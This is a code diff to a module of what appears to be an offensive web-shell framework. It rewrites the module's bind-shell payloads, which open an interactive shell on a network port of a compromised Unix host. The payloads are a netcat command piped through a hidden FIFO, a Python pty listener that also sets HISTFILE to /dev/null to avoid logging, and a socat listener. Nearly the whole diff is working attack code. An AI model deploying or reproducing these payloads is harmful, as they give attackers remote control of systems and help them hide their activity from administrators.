@@ -1,4 +1,4 @@
-from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
+from core.vectors import PythonCode, ShellCmd, Os
 from core.module import Module
 from core.loggers import log
 from core import messages
@@ -29,23 +29,39 @@ class Tcp(Module):
               background = True
               ),
             ShellCmd(
-              "rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc -l ${port} >/tmp/f; rm -rf /tmp/f",
-              name = 'netcat_bsd',
+              "rm -rf /tmp/.f;mkfifo /tmp/.f&&cat /tmp/.f|${shell} -i 2>&1|nc -l ${port} >/tmp/.f; rm -rf /tmp/.f",
+              name = 'nc.bsd',
               target = Os.NIX,
               background = True
               ),
-              ShellCmd(
-                """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", ${port}));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("${shell}");s.close()';""",
-                name = 'python_pty',
-                target = Os.NIX,
-                background = True
-              ),
-              ShellCmd(
-                """socat tcp-l:${port} exec:${shell}""",
-                name = 'socat',
-                target = Os.NIX,
-                background = True
-              )
+            PythonCode(
+                """
+                import pty,os,sys,socket
+                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                try:
+                    s.bind(("", ${port}))
+                    s.listen(1)
+                    (c, addr) = s.accept()
+                    with c:
+                        os.dup2(c.fileno(),0)
+                        os.dup2(c.fileno(),1)
+                        os.dup2(c.fileno(),2)
+                        os.putenv("HISTFILE",'/dev/null')
+                        pty.spawn("${shell}")
+                        c.close()
+                except Exception:
+                    s.close()""",
+              name = 'py.pty',
+              target = Os.NIX,
+              background = True
+            ),
+            ShellCmd(
+              """socat tcp-l:${port},reuseaddr,fork exec:'${shell}',pty,stderr,sane""",
+              name = 'socat',
+              target = Os.NIX,
+              background = True
+            )
             ]
         )
 
